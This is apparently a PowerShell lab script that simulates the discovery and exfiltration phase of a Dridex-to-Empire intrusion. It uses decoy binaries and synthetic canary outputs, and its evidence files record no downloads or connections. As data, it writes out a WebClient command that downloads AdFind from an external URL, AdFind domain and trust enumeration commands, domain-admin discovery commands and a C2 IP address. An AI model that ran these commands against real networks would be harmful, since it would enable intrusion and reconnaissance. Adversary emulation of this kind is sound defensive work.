#Requires -Version 5.1
#Requires -RunAsAdministrator
[CmdletBinding()]param([switch]$LabConfirmed)
. "$PSScriptRoot\DridexDomainSim-utilities.ps1";Assert-DDSafety -LabConfirmed:$LabConfirmed;$p=Initialize-DDEnvironment
$empire=Join-Path $p.Payloads 'powershell.exe';$adfind=Join-Path $p.Payloads 'adfind.exe';$shell=Join-Path $p.Payloads 'cmd.exe'
foreach($pair in @(@($empire,'Empire PowerShell stand-in'),@($adfind,'AdFind stand-in'),@($shell,'command-shell telemetry stand-in'))){New-DDDecoy -Path $pair[0] -Role $pair[1]}
Invoke-DDDecoy -FilePath $empire -Reported 'PowerShell encoded Empire launcher received in a Dridex POST response' -Parent 'Dridex-injected process' -Label 'NO-POWERSHELL-EMPIRE'
Invoke-DDLoopback -Port 80 -Target '194.99.22.145' -Role 'Empire C2 marker'
$download="(New-Object Net.WebClient).DownloadFile('http://msa.org.in/app/webroot/js/kcfinder/js/AdFind.bin','c:\Users\Public\adfind.exe')"
Invoke-DDDecoy -FilePath $empire -Reported $download -Parent 'Empire shell' -Label 'NO-DOWNLOAD'
$commands=@('adfind -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv','adfind -gcb -sc trustdmp > trustdmp.txt')
foreach($command in $commands){Invoke-DDDecoy -FilePath $adfind -Reported $command -Parent 'Empire PowerShell' -Label 'SYNTHETIC-ADFIND'}
Write-DDFile -Path(Join-Path $p.Staging 'some.csv')-Content "name,cn,OperatingSystem,dNSHostName`nDC01-CANARY,DC01-CANARY,Windows Server CANARY,dc01-canary.lab-canary.local`nWS01-CANARY,WS01-CANARY,Windows CANARY,ws01-canary.lab-canary.local" -Purpose synthetic-discovery-output
Write-DDFile -Path(Join-Path $p.Staging 'trustdmp.txt')-Content 'LAB-CANARY.LOCAL -> no trusts; synthetic output only.' -Purpose synthetic-discovery-output
$other=@('whoami.exe /user','whoami.exe /groups','net.exe group "domain admins" /domain')
foreach($command in $other){Invoke-DDDecoy -FilePath $shell -Reported $command -Parent 'Empire shell' -Label 'SYNTHETIC-IDENTITY-DISCOVERY'}
Write-DDJson -Path(Join-Path $p.Evidence 'empire-discovery.json')-Object([ordered]@{reportedAdFindDownload=$download;reportedCommands=$commands+$other;downloads=0;PowerShellExecuted=$false;directoryQueries=0;accountQueries=0;syntheticOutputs=@((Join-Path $p.Staging 'some.csv'),(Join-Path $p.Staging 'trustdmp.txt'))})-Purpose discovery
Write-DDJson -Path(Join-Path $p.Evidence 'dridex-exfiltration.json')-Object([ordered]@{reportedFiles=@('some.csv','trustdmp.txt');reportedChannel='Dridex C2';sourceFilesSynthetic=$true;exfiltrationSessions=0;bytesTransferred=0;externalConnections=0})-Purpose exfiltration
Add-DDTimeline 140 command-and-control 'Encoded Empire stage and long-lived Empire endpoint represented' @{PowerShellExecuted=$false;externalConnections=0}
Add-DDTimeline 160 discovery 'AdFind download and computer/trust queries represented with synthetic output' @{downloads=0;directoryQueries=0}
Add-DDTimeline 175 discovery 'Whoami and Domain Admin group discovery represented' @{accountQueries=0}
Add-DDTimeline 185 exfiltration 'Synthetic AdFind outputs represented as exfiltrated over Dridex' @{bytesTransferred=0;externalConnections=0}
Write-DDJson -Path(Join-Path $p.Evidence 'phase2-negative.json')-Object([ordered]@{PowerShellExecuted=$false;downloads=0;directoryQueries=0;accountQueries=0;exfiltrationSessions=0;externalConnections=0;bytesTransferred=0})-Purpose safety
